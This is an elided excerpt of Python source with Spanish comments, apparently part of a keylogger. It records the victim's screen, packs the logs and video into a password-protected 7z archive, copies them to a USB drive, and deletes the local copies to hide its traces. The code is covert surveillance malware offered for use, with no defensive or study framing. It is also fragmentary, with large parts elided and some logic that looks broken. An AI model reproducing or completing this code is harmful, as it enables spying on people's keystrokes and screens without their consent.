...
# Crear una carpeta capturasdepantalla en la carpeta del usuario
def createFolder():
    try:
...
def encrypt_and_compress_file(input_file, output_file, password):
    with py7zr.SevenZipFile(output_file, mode='w', password=password) as z:
        z.write(input_file)
        # Verificar si el archivo screen_record.mp4 existe antes de agregarlo
        if os.path.exists(os.path.join(usb_path, 'screen_record.mp4')):
            z.write(os.path.join(usb_path, 'screen_record.mp4'))
...
def record_screenshots():
    ...
    video_out = cv2.VideoWriter(os.path.join(usb_path, 'screen_record.mp4'), cv2.VideoWriter_fourcc(*'mp4v'), 5, (1920, 1080))
...
def copy_log_to_usb():
    ...
    if not os.path.exists(usb_config_file):
        ...
        if usb_stats.free > 1e9:  # 1GB en bytes
            ...
            shutil.copy(os.path.join(usb_path, 'screen_record.mp4'), usb_path)
...
if not (os.path.exists(os.path.join(usb_path, log_file)) and os.path.exists(os.path.join(usb_path, 'screen_record.mp4'))):
...
if usb_stats.free > keylogger_size:
    ...
    # Eliminar archivo de registro local y el archivo screen_record.mp4
    os.remove(log_file)
    os.remove(os.path.join(usb_path, 'screen_record.mp4'))
